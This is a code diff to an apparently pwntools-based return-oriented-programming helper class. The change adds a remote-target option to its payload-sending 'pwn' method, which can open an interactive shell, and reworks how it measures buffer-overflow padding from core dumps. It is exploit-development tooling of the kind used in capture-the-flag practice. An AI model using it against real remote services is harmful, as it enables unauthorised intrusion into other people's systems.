@@ -187,10 +187,21 @@ class PAPA_ROP:
         self.process.interactive()
         return
 
-    def pwn(self, prompt='', pwn_type='SHELL'):
-        self.start_process()
+    def pwn(self, prompt='', pwn_type='SHELL', process='LOCAL'):
+        # Start either local or remote process
+        if (process == 'REMOTE'):
+            self.start_remote()
+        elif (process == 'LOCAL'):
+            self.start_process()
+        else:
+            log.failure("Unknown process type " + process)
+            exit(1)
+
+        # Send payload
         self.payload = self.payload.rstrip() + '\n'
         self.sendafter(prompt, self.payload)
+        
+        # Do appropriate following action
         if (pwn_type == 'READ_ALL'):
             return self.recvall()
         elif (pwn_type == 'READ_LINE'):
@@ -218,7 +229,7 @@ class PAPA_ROP:
         return
 
     # Get the number of bytes before overflow occurs
-    def get_padding_length(self, initial):
+    def get_padding_length(self, initial=None):
         p = process(self.elf.path)
 
         # Get to overflow input
@@ -226,13 +237,13 @@ class PAPA_ROP:
             p.sendline(initial)
         
         # Find when the overflow occurs
-        p.sendline(cyclic(4096))
+        p.sendline(cyclic(10000))
         p.wait()
         core = p.corefile
         try:
-            sub = core.read(core.esp-4, 4)
+            sub = p32(core.fault_addr)
         except:
-            sub = core.read(core.rsp, 4)
+            sub = p64(core.fault_addr)
 
         return cyclic_find(sub)
 
